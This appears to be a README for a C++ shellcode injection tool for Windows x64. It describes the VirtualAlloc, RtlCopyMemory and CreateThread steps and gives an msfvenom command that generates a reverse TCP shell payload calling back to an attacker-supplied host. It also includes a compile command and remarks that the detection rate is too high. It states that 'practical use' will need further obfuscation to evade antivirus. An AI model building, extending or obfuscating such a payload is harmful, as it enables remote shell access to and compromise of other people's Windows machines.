# Shellcode Injection - Windows x64

Demonstrating basic shell code injection using Windows API and C++. 

## 💻 Features
- Manual shellcode allocation and execution
- Uses VirtualAlloc, RtlCopyMemory, CreateThread
- Tested on Windows 10 x64

## ⚙️ Shellcode
Shellcode generated using `msfvenom`:

````bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR.IP LPORT=PORT -f c
````

## ⚙️ Compilation
Can be compiled using the simple compilation command :

````bash
g++ inject_code.cpp -o shell_code.exe
````

## 🧠 How it Works
1. Allocate memory with `VirtualAlloc`
2. Copy shellcode to allocated region
3. Run with `CreateThread`

## 📁 File Structure

* `main.cpp` — injection code
* `shellcode.h` — contains unsigned char shellcode array

## 🖼️ Screenshots

  ![Injection Demo](screenshot/analysis.png)

  We could see that the detection rate is still high and needs more appropriate procedure to obfuscate it.

## 📝 Note :

* This is just a basic shell code injection for demonstration purposes and will need appropriate obfuscation when in practical use.
